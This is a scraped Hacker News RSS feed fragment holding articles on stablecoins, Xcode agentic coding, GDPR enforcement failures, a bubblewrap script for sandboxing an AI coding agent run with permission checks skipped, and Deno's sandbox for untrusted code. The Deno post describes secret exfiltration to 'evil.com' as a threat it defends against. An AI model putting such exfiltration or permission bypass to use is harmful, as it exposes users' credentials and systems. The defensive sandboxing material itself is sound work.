<p>Big Tech has taken notice, especially after President Donald Trump <a aria-label="Go to https://fortune.com/crypto/2025/07/18/trump-crypto-legislation-genius-act-stablecoin-conflict-of-intere/" href="https://fortune.com/crypto/2025/07/18/trump-crypto-legislation-genius-act-stablecoin-conflict-of-intere/">signed into law</a> in July a bill regulating the crypto assets. The fintech giant <a aria-label="Go to https://fortune.com/company/stripe/" target="_blank" href="https://fortune.com/company/stripe/">Stripe</a> <a aria-label="Go to https://www.cnbc.com/2025/02/04/stripe-closes-1point1-billion-bridge-deal-prepares-for-stablecoin-push-.html" href="https://www.cnbc.com/2025/02/04/stripe-closes-1point1-billion-bridge-deal-prepares-for-stablecoin-push-.html">completed</a> a $1.1 billion acquisition of stablecoin startup Bridge in February 2025 and has since <a aria-label="Go to https://fortune.com/crypto/2025/10/17/stripe-paradigm-tempo-series-a-5-billion-thrive-capital-greenoaks-joshua-kushner/" href="https://fortune.com/crypto/2025/10/17/stripe-paradigm-tempo-series-a-5-billion-thrive-capital-greenoaks-joshua-kushner/">backed</a> its own blockchain designed for stablecoin transactions. The cloud infrastructure company <a aria-label="Go to https://fortune.com/company/cloudfare/" target="_blank" href="https://fortune.com/company/cloudfare/">Cloudflare</a> <a aria-label="Go to https://www.cloudflare.com/press/press-releases/2025/cloudflare-introduces-net-dollar-to-support-a-new-business-model-for-the-ai-driven-internet/" href="https://www.cloudflare.com/press/press-releases/2025/cloudflare-introduces-net-dollar-to-support-a-new-business-model-for-the-ai-driven-internet/">announced</a> its intention to launch its own stablecoin in September. And the buy-now, pay-later firm Klarna <a aria-label="Go to https://www.klarna.com/international/press/klarna-launches-klarnausd-as-stablecoin-transactions-hit-usd27-trillion/" href="https://www.klarna.com/international/press/klarna-launches-klarnausd-as-stablecoin-transactions-hit-usd27-trillion/">launched</a> its own token as well in November.&nbsp;&nbsp;</p>



<p>Those announcements largely came during a more bullish crypto market that saw Bitcoin and other tokens notch all-time highs. Now, sentiment has soured as the world’s largest cryptocurrency nears monthslong lows. But, Dalal, the visiting partner at Y Combinator, said that bearish outlook doesn’t apply to stablecoins. “The excitement on stablecoins is just growing,” he said. “It’s actually agnostic of prices.”</p>
</div><div><p><span><strong>Join us at the Fortune Workplace Innovation Summit </strong>May 19–20, 2026, in Atlanta. The next era of workplace innovation is here—and the old playbook is being rewritten. At this exclusive, high-energy event, the world’s most innovative leaders will convene to explore how AI, humanity, and strategy converge to redefine, again, the future of work. <a href="https://conferences.fortune.com/event/workplace-innovation-2026/HOME">Register now</a>.</span></p></div></article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Xcode 26.3 unlocks the power of agentic coding (352 pts)]]></title>
            <link>https://www.apple.com/newsroom/2026/02/xcode-26-point-3-unlocks-the-power-of-agentic-coding/</link>
            <guid>46874619</guid>
            <pubDate>Tue, 03 Feb 2026 18:04:08 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.apple.com/newsroom/2026/02/xcode-26-point-3-unlocks-the-power-of-agentic-coding/">https://www.apple.com/newsroom/2026/02/xcode-26-point-3-unlocks-the-power-of-agentic-coding/</a>, See on <a href="https://news.ycombinator.com/item?id=46874619">Hacker News</a></p>
<div id="readability-page-1" class="page">


	
    







 
<nav id="ac-localnav" lang="en-US" role="navigation" aria-label="Newsroom" data-analytics-region="local nav" data-sticky="">
	
    
    
        




    
    
    
	
	

</nav>





<main id="main" role="main"> 




<span id="opens-in-new-window">opens in new window</span>
<section>
<article data-analytics-activitymap-region-id="article">






    
    
    









    





    <div>
        
		
        

        <div>
                
                
                
                    <h2>
                        
    
        Xcode 26.3 unlocks the power of agentic coding
    

                    </h2>
                
            </div>

        <div>
                
                
                    Developers can leverage coding agents, including Anthropic’s Claude Agent and OpenAI’s Codex, directly in Xcode to tackle complex tasks autonomously, helping them develop apps faster than ever
                
            </div>

        
            
    
    
    
    
    

        

    </div>







    
    
    






  
    
    
    
    
      <figure aria-label="Media, A MacBook Pro desktop shows the Xcode app with new agentic coding capabilities.">
        <div>
             
              
              <div>
                Xcode 26.3 unlocks agentic coding, allowing developers to harness agents like Anthropic’s Claude Agent and OpenAI’s Codex directly in Xcode.
              </div>
            
            
            
            
            <a href="https://www.apple.com/newsroom/images/2026/02/xcode-26-point-3-unlocks-the-power-of-agentic-coding/article/Apple-Xcode-agentic-coding-hero.zip" download="" data-analytics-title="download image - Apple-Xcode-agentic-coding-hero_big" aria-label="Download media, A MacBook Pro desktop shows the Xcode app with new agentic coding capabilities."></a>
          </div>
      </figure>
    
  








    
    
    


     
     
    
    
        <div>
             
                 <div>Xcode 26.3 introduces support for agentic coding, a new way in Xcode for developers to build apps using coding agents such as Anthropic’s Claude Agent and OpenAI’s Codex. With agentic coding, Xcode can work with greater autonomy toward a developer’s goals — from breaking down tasks to making decisions based on the project architecture and using built-in tools.
</div>
                 
             
                 <div>Expanding on the intelligence features introduced in Xcode 26, which brought a brand-new coding assistant for writing and editing in Swift, this release gives coding agents access to even more of Xcode’s capabilities. Agents like Claude Agent and Codex can now collaborate throughout the entire development life cycle, giving developers the power to streamline workflows, iterate faster, and bring ideas to life like never before. Agents can search documentation, explore file structures, update project settings, and verify their work visually by capturing Xcode Previews and iterating through builds and fixes.
</div>
                 
             
                 <div>“At Apple, our goal is to make tools that put industry-leading technologies directly in developers’ hands so they can build the very best apps,” said Susan Prescott, Apple’s vice president of Worldwide Developer Relations. “Agentic coding supercharges productivity and creativity, streamlining the development workflow so developers can focus on innovation.”
</div>
                 
             
         </div>
 

    
    
    


    
    
        
        
        
            <div role="group" aria-label="gallery" data-component-list="MixinGallery" id="agentic-coding-xcode">
            <nav role="presentation">
                <ul role="tablist">
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-f54f2b2d489a1e03e9e1f58421bd55e0" href="#gallery-f54f2b2d489a1e03e9e1f58421bd55e0" data-ac-gallery-trigger="gallery-f54f2b2d489a1e03e9e1f58421bd55e0"><span>In Xcode, a developer uses agentic coding for an iPhone app showing a detailed view of Mount Fuji.</span></a>
                        </li>
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-f1c57acfbe17cfd81f24869a683111d3" href="#gallery-f1c57acfbe17cfd81f24869a683111d3" data-ac-gallery-trigger="gallery-f1c57acfbe17cfd81f24869a683111d3"><span>In Xcode, a developer uses agentic coding for an iPhone app showing a detailed view of Yellowstone National Park.</span></a>
                        </li>
                    
                </ul>
            </nav>
            <div>
                
                    
                        
                        <div id="gallery-f54f2b2d489a1e03e9e1f58421bd55e0" aria-labelledby="gallery-dotnav-f54f2b2d489a1e03e9e1f58421bd55e0" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:mount-fuji">
                                
                                <div>
                                    <div>With seamless access to Anthropic’s Claude Agent (pictured) and OpenAI’s Codex, developers can bring the advanced reasoning of powerful models directly into their app-building workflow.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2026/02/xcode-26-point-3-unlocks-the-power-of-agentic-coding/article/Apple-Xcode-agentic-coding-with-Anthropic-Claude-Agent.zip" download="" data-analytics-title="download image - Apple-Xcode-agentic-coding-with-Anthropic-Claude-Agent_big" aria-label="Download media, In Xcode, a developer uses agentic coding for an iPhone app showing a detailed view of Mount Fuji."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
                    
                        
                        <div id="gallery-f1c57acfbe17cfd81f24869a683111d3" aria-labelledby="gallery-dotnav-f1c57acfbe17cfd81f24869a683111d3" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:yellowstone-national-park">
                                
                                <div>
                                    <div>With seamless access to Anthropic’s Claude Agent and OpenAI’s Codex (pictured), developers can bring the advanced reasoning of powerful models directly into their app-building workflow.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2026/02/xcode-26-point-3-unlocks-the-power-of-agentic-coding/article/Apple-Xcode-agentic-coding-with-OpenAI-Codex.zip" download="" data-analytics-title="download image - Apple-Xcode-agentic-coding-with-OpenAI-Codex_big" aria-label="Download media, In Xcode, a developer uses agentic coding for an iPhone app showing a detailed view of Yellowstone National Park."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
            </div>
            
                
                
                <nav role="presentation">
                    
                        <ul>
                            <li>
                                
                            </li>
                            <li>
                                
                            </li>
                        </ul>
                    
                </nav>
            
        </div>
    


    
    
    


     
     
    
    
        <div>
             
                 <div>With seamless access to Claude Agent and Codex, developers can bring the advanced reasoning of these models directly into their app-building workflow.<sup>1</sup> This connection combines the power of these agents with Xcode’s native capabilities to provide the best results when developing for Apple platforms, giving developers the flexibility to work with the model that best fits their project.
</div>
                 
             
                 <div>In addition to these built-in integrations, Xcode 26.3 makes its capabilities available through the Model Context Protocol, an open standard that gives developers the flexibility to use any compatible agent or tool with Xcode.
</div>
                 
             
         </div>
 

    
    
    


     
     
    
    
        <div>Xcode 26.3 is available as a release candidate for all members of the Apple Developer Program starting today, with a release coming soon on the App Store.
</div>
 

    
    
    




    
    
        
    


    
    
    



    
    
    





    
    
    <div>
            <ol>
<li>Anthropic and OpenAI’s terms of service may apply.</li>
</ol>

        </div>



    
    
    






    















	

		
		
			
























		
		

</article>



</section>
</main>



<div>
            Stay up to date with the latest articles from Apple Newsroom.
        </div>
	

</div>]]></description>
        </item>
        <item>
            <title><![CDATA[I made 20 GDPR deletion requests. 12 were ignored (137 pts)]]></title>
            <link>https://nikolak.com/gdpr-failure/</link>
            <guid>46874345</guid>
            <pubDate>Tue, 03 Feb 2026 17:48:22 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://nikolak.com/gdpr-failure/">https://nikolak.com/gdpr-failure/</a>, See on <a href="https://news.ycombinator.com/item?id=46874345">Hacker News</a></p>
<div id="readability-page-1" class="page"><section>
        <p>GDPR is one of the things that both EU citizens like to brag about, and companies like to advertise with. But as someone who does make extensive use of it, the entire process is flawed, the laws are ignored, and enforcement is borderline impossible. It's the data protection equivalent of the cookie popups, which I'd even argue are more effective in their goal.</p><p>Whenever a company has my data and uses it for marketing purposes without an easy opt out, or a company has my data and I stop using their services, I generally like to have the data deleted or to withdraw certain consent like for marketing purposes. Sometimes this is easy, but sometimes it requires invoking my GDPR rights as a EU citizen to actually get done.</p><p>In the past year I have made around 20 GDPR data deletion/information requests to various companies. Only 2 have complied immediately, further 6 have complied after filing a complaint with the data protection office, the remaining 12 have not complied. Large companies, charities, companies that advertise explicitly with "Made in EU/GDPR Compliant". From Greenpeace, government funded museums, to open source companies, completely fail at this.</p><div><p>💡</p><p>I am aware that some data, such as invoices, or other data may be kept for longer period due to various financial laws. Whenever I speak of "data" in this article I'm referring to things like profile pictures, phone number(s), emails, stored addresses, online accounts viewable by others, and so on.</p></div><p>Let's look at how one of the bigger companies in 3D Printing world, that often gets mentioned for their privacy and the fact that they're from EU and GDPR compliant, Prusa 3D, handles a simple request to delete user data:</p><ol><li>Step one, change the user's email</li></ol><figure><img src="https://nikolak.com/content/images/2026/02/image.png" alt="" loading="lazy" width="1698" height="792" srcset="https://nikolak.com/content/images/size/w600/2026/02/image.png 600w, https://nikolak.com/content/images/size/w1000/2026/02/image.png 1000w, https://nikolak.com/content/images/size/w1600/2026/02/image.png 1600w, https://nikolak.com/content/images/2026/02/image.png 1698w" sizes="(min-width: 720px) 720px"></figure><ol start="2"><li>Step two, say that you deleted the data:</li></ol><figure><img src="https://nikolak.com/content/images/2026/02/image-1.png" alt="" loading="lazy" width="1674" height="708" srcset="https://nikolak.com/content/images/size/w600/2026/02/image-1.png 600w, https://nikolak.com/content/images/size/w1000/2026/02/image-1.png 1000w, https://nikolak.com/content/images/size/w1600/2026/02/image-1.png 1600w, https://nikolak.com/content/images/2026/02/image-1.png 1674w" sizes="(min-width: 720px) 720px"></figure><p>To this day, I still can view and verify that they have in fact not deleted my data. I even added a "GDPR Failed" address to my account after the email, so they're not even blocking it in some way.</p><p>The email says "request from 28 November 2025", the truth is that I sent a GDPR deletion request in 2024, and this was just a reminder that they still haven't processed it. This is also after the "GDPR Advisor" saying that requesting data deletion via email isn't even legally allowed, which is completely wrong.</p><h2 id="regulatory-hell">Regulatory hell</h2><p>Taking the example from above, you'd think that a company blatantly ignoring a deletion request would be straightforward to report. Company has data, company was asked to delete it, company didn't. Open and shut.</p><p>I reported Prusa to the Czech data protection office back in 2024 (case UOOUX00H3395). As of writing, they have never processed my request. They never replied to my follow-ups, written in both Czech and English. Nothing happened.</p><p>The German data protection office was more responsive - they replied after about a month, telling me there's nothing they can do. Their only option would be to contact their Czech counterparts, and since I already did that, the chain ends there. So despite being a German citizen, my data protection rights depend entirely on the enforcement capacity and willingness of a foreign regulatory body.</p><p>This is the reality for any cross-border GDPR complaint. The regulation is EU-wide, but enforcement is national. If the company sits in a country where the data protection office is underfunded, understaffed, or simply doesn't care, you're out of luck. Your only remaining option is to hire a lawyer, pay out of pocket, and sue a company in another country for something they should have done after a single email.</p><p>Of the 12 companies that still haven't complied with my requests, the pattern is the same. The data protection office either didn't respond, didn't act, or the company simply ignored the office too. The data is still there. The accounts are still active. Nothing changed.</p><h2 id="the-spam-filter-loophole">The spam filter loophole</h2><p>For the 6 companies that did comply after I involved the data protection offices, most gave the same excuse: they never received the request.</p><p>A few went further. They claimed their IT systems automatically categorized my GDPR request as spam and deleted it before anyone saw it. And the data protection agencies accepted this.</p><p>Here's the exact legal reasoning I was given when I reported the Naturhistorisches Museum Wien - a government-funded museum, translated:</p><blockquote>According to Art. 12 (3) GDPR, the deadline for processing a request to exercise data subject rights only begins upon actual receipt by the controller. An email that is automatically processed by upstream IT security systems (e.g., spam or malware filters) and does not reach the responsible organizational units is legally not considered as received. The GDPR does not establish an obligation to manually review all automatically filtered messages.</blockquote><p>Read that again. A company can list an email address as their official GDPR contact in their privacy policy, and if their own spam filter eats your request, it legally never happened. There is no obligation to check. There is no obligation to ensure delivery. The burden is entirely on you to prove they received it.</p><p>This isn't an edge case. This is a systemic loophole that allows any company to quietly discard data protection requests with zero consequences. Set up aggressive spam filtering on your GDPR inbox, and you've effectively opted out of the regulation.</p><p>And if you do follow up, the clock resets. The 30-day response window from Art. 12 (3) starts from "actual receipt," which means the company can play this game indefinitely.</p><h2 id="changes-are-needed">Changes are needed</h2><p>GDPR in its essence is not bad. The rights it grants are reasonable and necessary. But the enforcement infrastructure around it is broken, and without serious changes, it will remain a regulation that only those who already care about privacy comply with.</p><p><strong>Cross-border enforcement needs to actually work.</strong> If I'm a German citizen and a Czech company violates my rights, there needs to be a mechanism that doesn't dead-end at "we forwarded it to the Czech office, good luck." The EU needs to either centralize cross-border complaints or give national offices the authority to enforce against companies in other member states directly.</p><p><strong>The spam filter loophole needs to die.</strong> Companies should be required to implement a standardized, verifiable request method. A web form, a dedicated portal, something that generates a confirmation and a timestamp. If a company lists only an email address for GDPR requests, they should be liable for delivery failures on their end. You can't advertise an email as the official channel and then claim your own infrastructure made it unreachable.</p><p><strong>There need to be mandatory minimum fines.</strong> Not the theoretical 4% of global revenue that only ever hits trillion-dollar companies. A flat minimum, say 5,000€ per violation, no matter how small the company, applied automatically when non-compliance is confirmed. No appeals on the fine itself, only on whether the violation occurred. Right now, the cost of ignoring a GDPR request from an individual is zero. That needs to change.</p><p><strong>Data protection offices need funding and accountability.</strong> An unanswered complaint is a failed complaint. If a regulatory body can't process reports in a reasonable timeframe, it's not regulating anything. There should be public reporting on resolution times and outcomes, so citizens can see whether their data protection office is actually functioning.</p><h2 id="nobody-cares-and-thats-the-problem">Nobody cares, and that's the problem</h2><p>The news occasionally reports that some S&amp;P 100 company got fined a few million for a data protection violation, and everyone cheers. That's the visible part. The invisible part is millions of individuals whose requests get ignored, discarded, or lost in bureaucratic limbo with no recourse.</p><p>Nobody checks whether companies actually comply. Nobody audits the small and mid-sized businesses. The enforcement agencies don't have the resources, and the EU doesn't seem interested in giving them more.</p><p>I'm sure I'm not alone in this. I'm convinced that GDPR rights are being violated at a massive scale, every single day, by companies of every size. But unless there's a headline-worthy fine to collect from a company with a trillion-dollar valuation, nobody cares.</p><p>The regulation exists. The enforcement doesn't.</p>
    </section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Sandboxing AI Agents in Linux (112 pts)]]></title>
            <link>https://blog.senko.net/sandboxing-ai-agents-in-linux</link>
            <guid>46874139</guid>
            <pubDate>Tue, 03 Feb 2026 17:35:37 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.senko.net/sandboxing-ai-agents-in-linux">https://blog.senko.net/sandboxing-ai-agents-in-linux</a>, See on <a href="https://news.ycombinator.com/item?id=46874139">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>Like many developers, I find myself more and more using AI agents to help with software development.</p>

<p>I currently use Claude Code, the command line interface, together with Opus 4.5 (Anthropic's top model as of this writing). I use it to distill my rough task requirements into a detailed development plan, then implement the plan.</p>

<p>By default, Claude Code asks each time if it may read and write files and run software. This is sensible default configuration, but does get annoying after a time. Worse, it interrupts me often enough that I can't do much in parallel while babysitting it.</p>

<p>There's also a <code>--dangerously-skip-permissions</code> (a.k.a. “YOLO”) mode which will happily run anything without asking. This can be risky (although I know of some people that run it like that and still haven't destroyed their dev machines).</p>

<h2 id="sandboxing">Sandboxing</h2>

<p>The standard solution is to sandbox the agent – either on a remote machine (<a href="https://exe.dev/" rel="nofollow">exe.dev</a>, <a href="https://sprites.dev/" rel="nofollow">sprites.dev</a>, <a href="https://daytona.io/" rel="nofollow">daytona.io</a>), or locally via Docker or other virtualization mechanism.</p>

<p>A lightweight alternative on Linux is <a href="https://github.com/containers/bubblewrap" rel="nofollow">bubblewrap</a>, which uses Linux kernel features like cgroups and user namespaces to limit (jail) a process.</p>

<p>As it turns out, bubblewrap is a good solution for lightweight sandboxing of AI agents. Here's what I personally need from such a solution:</p>
<ul><li>mimic my regular Linux dev machine setup (I don't want to manage multiple dev environment)</li>
<li>minimal/no access to information outside what's required for the current project</li>
<li>write access only to the current project</li>
<li>can directly operate on the files/folders of the project so I can easily inspect or modify the same files from my IDE or run the code myself</li>
<li>network access – both to connect to AI providers and search the internet, and to be able to start a server that I can connect to</li></ul>

<p>Bubblewrap and Docker are not hardened security isolation mechanisms, but that's okay with me. I'm not really concerned about the following risks:</p>
<ul><li>escape via zero-day Linux kernel bug</li>
<li>covert side channel communications</li>
<li>exfiltration of data from current project (including project-specific access keys)</li>
<li>screwing up the codebase (the code is managed via <code>git</code> and backed up at GitHub or elsewhere)</li></ul>

<p>The last bit is tricky, but even full remote sandboxes can't protect against that. In theory, we could have transparent API proxies that would inject proper access keys without the AI agent ever being aware of it, but this is really non-trivial to set up right now.</p>

<p>An alternative is to contain potential damage by creating project-specific API keys so at least the blast area is minimal if those keys are leaked.</p>

<h2 id="in-practice">In practice</h2>

<p>Here's how my bubblewrap sandbox script looks:</p>

<pre><code>#!/usr/bin/bash

exec 3&lt;$HOME/.claude.json

exec /usr/bin/bwrap \
    --tmpfs /tmp \
    --dev /dev \
    --proc /proc \
    --hostname bubblewrap --unshare-uts \
    --ro-bind /bin /bin \
    --ro-bind /lib /lib \
    --ro-bind /lib32 /lib32 \
    --ro-bind /lib64 /lib64 \
    --ro-bind /usr/bin /usr/bin \
    --ro-bind /usr/lib /usr/lib \
    --ro-bind /usr/local/bin /usr/local/bin \
    --ro-bind /usr/local/lib /usr/local/lib \
    --ro-bind /opt/node/node-v22.11.0-linux-x64/ /opt/node/node-v22.11.0-linux-x64/ \
    --ro-bind /etc/alternatives /etc/alternatives \
    --ro-bind /etc/resolv.conf /etc/resolv.conf \
    --ro-bind /etc/profile.d /etc/profile.d \
    --ro-bind /etc/bash_completion.d /etc/bash_completion.d \
    --ro-bind /etc/ssl/certs /etc/ssl/certs \
    --ro-bind /etc/ld.so.cache /etc/ld.so.cache \
    --ro-bind /etc/ld.so.conf /etc/ld.so.conf \
    --ro-bind /etc/ld.so.conf.d /etc/ld.so.conf.d \
    --ro-bind /etc/localtime /etc/localtime \
    --ro-bind /usr/share/terminfo /usr/share/terminfo \
    --ro-bind /usr/share/ca-certificates /usr/share/ca-certificates \
    --ro-bind /etc/nsswitch.conf /etc/nsswitch.conf \
    --ro-bind /etc/hosts /etc/hosts \
    --ro-bind /etc/ssl/openssl.cnf /etc/ssl/openssl.cnf \
    --ro-bind /usr/share/zoneinfo /usr/share/zoneinfo \
    --ro-bind $HOME/.bashrc $HOME/.bashrc \
    --ro-bind $HOME/.profile $HOME/.profile \
    --ro-bind $HOME/.gitconfig $HOME/.gitconfig \
    --ro-bind $HOME/.local $HOME/.local \
    --bind $HOME/.claude $HOME/.claude \
    --bind $HOME/.cache $HOME/.cache \
    --file 3 $HOME/.claude.json \
    --bind "$PWD" "$PWD" \
    claude --dangerously-skip-permissions $@
</code></pre>

<p>If this looks rather idiosyncratic, it's because it is. Rather than using some generic rules, I experimented with <code>bwrap</code> until I found minimal configuration that I need to set up for my system.</p>

<p>Some interesting stuff:</p>
<ul><li><code>/tmp</code>, <code>/proc</code> and <code>/dev</code> are automatically handled by <code>bwrap</code></li>
<li>I bind-mount (ie. expose) files and directories under the same path as local machine, so there's no difference in file locations, project paths, etc</li>
<li>I don't expose entire <code>/etc</code>, just the bare minimum</li>
<li>The content of <code>$HOME/.claude.json</code> is injected into the sandbox so any changes there won't get saved to the real one</li>
<li>The content of <code>$HOME/.claude/</code> directory <em>is</em> mapped read-write, so Claude can save and modify files there (such as session data)</li>
<li><code>/opt/node/node-v22.11.0-linux-x64/</code> is my custom <code>nodejs</code> install location</li>
<li>I change the hostname so it's easy to distinguish between the host and sandbox</li></ul>

<p>I will probably be tweaking the script as needed, but this is a pretty good starting point for me.</p>

<h2 id="how-to-customize">How to customize</h2>

<p>If you want to adapt this to another AI agent or to your system, my suggestion is to tweak the script to run <code>bash</code> instead, then run your agent manually, see what breaks and tweak as appropriate.</p>

<p>A useful command for this is <code>strace</code>, which can trace file access system calls so you can see what's needed:</p>

<pre><code>strace -e trace=open,openat,stat,statx,access -o /tmp/strace.log codex
</code></pre>

<p>Inspecting the log you can spot which files are needed and bind them as needed.</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Deno Sandbox (504 pts)]]></title>
            <link>https://deno.com/blog/introducing-deno-sandbox</link>
            <guid>46874097</guid>
            <pubDate>Tue, 03 Feb 2026 17:33:20 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://deno.com/blog/introducing-deno-sandbox">https://deno.com/blog/introducing-deno-sandbox</a>, See on <a href="https://news.ycombinator.com/item?id=46874097">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>Over the past year, we’ve seen a shift in what Deno Deploy customers are
building: platforms where users generate code with LLMs, and that code runs
immediately without review. That code frequently calls LLMs itself, which means
it needs API keys and network access.</p>
<p>This isn’t the traditional “run untrusted plugins” problem. It’s deeper:
LLM-generated code, calling external APIs with real credentials, without human
review. Sandboxing the compute isn’t enough. You need to control network egress
and protect secrets from exfiltration.</p>
<p>Deno Sandbox provides both. And when the code is ready, you can deploy it
directly to Deno Deploy without rebuilding.</p>


<figure>

<lite-youtube videoid="u1ppsGMUUuo" videostartat="1243">
  <img slot="image" src="https://deno.com/sandboxes/video-thumbnail.webp">
</lite-youtube>

<figcaption>
Watch the full announcement video here.
</figcaption>
</figure>

<h2 id="sandboxes">Sandboxes?</h2>
<p>You don’t want to run untrusted code (generated by your LLMs, your users LLMs,
or even hand written by users) directly on your server. It will compromise your
system, steal your API keys, and call out to evil.com. You need isolation.</p>
<p>Deno Sandbox gives you lightweight Linux microVMs (running in the Deno Deploy
cloud) to run untrusted code with defense-in-depth security. You create or
programmatically via our JavaScript or Python SDKs, and they boot in under a
second. You can also interact with them via SSH, HTTP, or even open a VS Code
window directly into the sandbox.</p>
<div><pre><span>import</span> <span><span>{</span> <span>Sandbox</span> <span>}</span></span> <span>from</span> <span>"@deno/sandbox"</span><span>;</span>

<span>await</span> using sandbox <span>=</span> <span>await</span> <span>Sandbox</span><span>.</span><span>create</span><span>(</span><span>)</span><span>;</span>
<span>await</span> sandbox<span>.</span><span>sh</span><span><span>`</span><span>ls -lh /</span><span>`</span></span><span>;</span></pre></div><h2 id="secrets-that-cant-be-stolen">Secrets That Can’t Be Stolen</h2>
<p>But there is more. In Deno Sandbox, secrets never enter the environment. Code
sees only a placeholder:</p>
<div><pre><span>import</span> <span><span>{</span> <span>Sandbox</span> <span>}</span></span> <span>from</span> <span>"@deno/sandbox"</span><span>;</span>

<span>await</span> using sandbox <span>=</span> <span>await</span> <span>Sandbox</span><span>.</span><span>create</span><span>(</span><span>{</span>
  secrets<span>:</span> <span>{</span>
    <span>OPENAI_API_KEY</span><span>:</span> <span>{</span>
      hosts<span>:</span> <span>[</span><span>"api.openai.com"</span><span>]</span><span>,</span>
      value<span>:</span> process<span>.</span><span>env</span><span>.</span><span>OPENAI_API_KEY</span><span>,</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>)</span><span>;</span>

<span>await</span> sandbox<span>.</span><span>sh</span><span><span>`</span><span>echo $OPENAI_API_KEY</span><span>`</span></span><span>;</span>
</pre></div><p>The real key materializes only when the sandbox makes an outbound request to an
approved host. If prompt-injected code tries to exfiltrate that placeholder to
<code>evil.com</code>? Useless.</p>
<h2 id="network-egress-control">Network Egress Control</h2>
<p>You can also restrict which hosts the sandbox can talk to:</p>
<div><pre><span>await</span> using sandbox <span>=</span> <span>await</span> <span>Sandbox</span><span>.</span><span>create</span><span>(</span><span>{</span>
  allowNet<span>:</span> <span>[</span><span>"api.openai.com"</span><span>,</span> <span>"*.anthropic.com"</span><span>]</span><span>,</span>
<span>}</span><span>)</span><span>;</span></pre></div><p>Any request to an unlisted host gets blocked at the VM boundary.</p>
<p>Both features are implemented via an outbound proxy similar to
<a href="https://github.com/coder/httpjail" rel="noopener noreferrer">coder/httpjail</a>. This gives us a chokepoint
for policy enforcement. We plan to add more capabilities here: analytics for
outbound connections and programmatic hooks for trusted code to inspect or
modify requests.</p>
<p>If you’re running untrusted JavaScript or TypeScript, combine this with Deno’s
<code>--allow-net</code> flag for defense in depth: VM-level network restrictions plus
runtime-level permissions.</p>
<h2 id="sandbox-to-production">Sandbox to Production</h2>
<p><code>sandbox.deploy()</code> deploys code from your sandbox directly to Deno Deploy.</p>
<div><pre><span>const</span> build <span>=</span> <span>await</span> sandbox<span>.</span><span>deploy</span><span>(</span><span>"my-app"</span><span>,</span> <span>{</span>
  production<span>:</span> <span>true</span><span>,</span>
  build<span>:</span> <span>{</span> mode<span>:</span> <span>"none"</span><span>,</span> entrypoint<span>:</span> <span>"server.ts"</span> <span>}</span><span>,</span>
<span>}</span><span>)</span><span>;</span>

<span>const</span> revision <span>=</span> <span>await</span> build<span>.</span><span>done</span><span>;</span>
<span>console</span><span>.</span><span>log</span><span>(</span>revision<span>.</span><span>url</span><span>)</span><span>;</span></pre></div><p>One call to go from sandbox to production deployment. No rebuilding in a
different CI system, no re-authenticating with a different tool. Just turn your
dev environment directly into a production ready, auto-scaling serverless
deployment.</p>
<h2 id="persistence">Persistence</h2>
<p>Sandboxes are ephemeral by default, but when you need state we have you covered:</p>
<ul>
<li><strong>Volumes</strong>: read-write storage for caches, databases, user data</li>
<li><strong>Snapshots</strong>: read-only images for pre-installed toolchains and volume base</li>
</ul>
<p>Run <code>apt-get install</code> once, snapshot it, and every future sandbox boots with
everything already installed. Create read-write volumes from the snapshots to
create a fresh development environment in seconds.</p>
<h2 id="technical-details">Technical Details</h2>
<div><table>
<thead>
<tr>
<th>Spec</th>
<th>Value</th>
</tr>
</thead>
<tbody><tr>
<td>Regions</td>
<td>Amsterdam, Chicago</td>
</tr>
<tr>
<td>vCPUs</td>
<td>2</td>
</tr>
<tr>
<td>Memory</td>
<td>768 MB - 4 GB</td>
</tr>
<tr>
<td>Lifetime</td>
<td>Ephemeral or timeout (supports extending on demand)</td>
</tr>
<tr>
<td>Max lifetime</td>
<td>30 minutes</td>
</tr>
<tr>
<td>Boot time</td>
<td>&lt; 1 second</td>
</tr>
</tbody></table></div>
<p>Perfect for AI agents executing code, vibe-coding environments, secure plugin
systems, ephemeral CI runners, and customer-supplied code.</p>
<h2 id="pricing">Pricing</h2>
<p>Deno Sandbox is included in your Deno Deploy plan with competitive, usage-based
pricing. You pay for compute time, not wall-clock time.</p>
<ul>
<li><strong>$0.05/h</strong> CPU time (40h included with Pro)</li>
<li><strong>$0.016/GB-h</strong> memory (1000 GB-h included with Pro)</li>
<li><strong>$0.20/GiB-month</strong> volume storage (5 GiB included with Pro)</li>
</ul>
<p><a href="https://deno.com/deploy/pricing" rel="noopener noreferrer">See full pricing details →</a></p>
<p>Enterprise pricing available—contact <a href="mailto:deploy@deno.com" rel="noopener noreferrer">deploy@deno.com</a>.</p>
<h2 id="get-started">Get Started</h2>
<p>Deno Sandbox launches in beta today, alongside the
<a href="https://deno.com/blog/deno-deploy-is-ga" rel="noopener noreferrer">general availability of Deno Deploy</a>.</p>
<ul>
<li>Landing page: <a href="https://deno.com/sandbox" rel="noopener noreferrer">deno.com/sandbox</a></li>
<li>Docs: <a href="https://docs.deno.com/sandbox/" rel="noopener noreferrer">docs.deno.com/sandbox</a></li>
<li>JavaScript SDK: <a href="https://jsr.io/@deno/sandbox" rel="noopener noreferrer">jsr.io/@deno/sandbox</a> or
<a href="https://www.npmjs.com/package/@deno/sandbox" rel="noopener noreferrer">npm</a></li>
<li>Python SDK:
<a href="https://pypi.org/project/deno-sandbox/" rel="noopener noreferrer">pypi.org/project/deno-sandbox</a></li>
</ul>
<p>We’re excited to see what you (or your AI agents) build with Deno Sandbox.</p>
</div></div>]]></description>
        </item>
    </channel>
</rss>